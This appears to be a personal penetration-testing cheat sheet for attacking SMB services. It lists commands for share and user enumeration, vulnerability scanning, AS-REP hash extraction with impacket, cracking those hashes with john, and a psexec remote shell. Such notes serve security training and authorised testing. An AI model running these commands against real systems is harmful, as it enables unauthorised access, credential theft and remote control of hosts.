---
title: (139/445) SMB
updated: 2023-11-29 02:41:39Z
created: 2023-11-29 02:32:05Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

## SMB

1.  **Enumerate smb:**  
    `nmap --script=smb2-security-mode.nse -p139,445 <target IP>`
    
2.  **Enumerate shares**  
    `nmap -p139,445 --script=smb-enum* <target IP>`
    
3.  **Scan for vulnerablities**  
    `nmap --script-args=unsafe=1 --script=smb-vulns*.nse -p139,445 <target IP>`  
    `nmap --script=smb-proto* -p139,445 <target IP>`  
    `nmap --script=smb-os-discovery.nse -p139,445 <target IP>`
    
    **List mounts:**  
    `showmount --exports <target IP>`
    
4.  **List shares:**  
    `smbclient -L \\\\<target ip>`  
    **Connect to share:**
    
5.  `smbclient //<target ip>/<share>`  
    `smbclient \\\\<target IP>\\IPC$`  
    **Download from share:**
    
6.  `smbget -R smb://<ip>/<share>`
    
7.  Enumerate with **crackmapexec**  
    `crackmapexec smb <target IP> -u '' -p '' --users`  
    `crackmapexec smb <target IP> -u '' -p '' --groups`  
    `crackmapexec smb <target IP> -u '' -p '' --pass-pol`
    
8.  `python3 /opt/impacket/GetNPUsers.py -dc-ip <targetIP> -request 'domain.com/'`  
    If any hashes found, crack then with:  
    `john --format=krb5asrep \ -w=/usr/share/wordlists/rockyou.txt hash.txt`
    
9.  `python3 /opt/impacket/smbserver.py -smb2support myshare .`  
    Check for SMB not enforcing signing , see SMBrelay.
    
10. Connect a shell over SMB using psexec  
    `psexec.py administrator@<targetIP> # password: abc123!`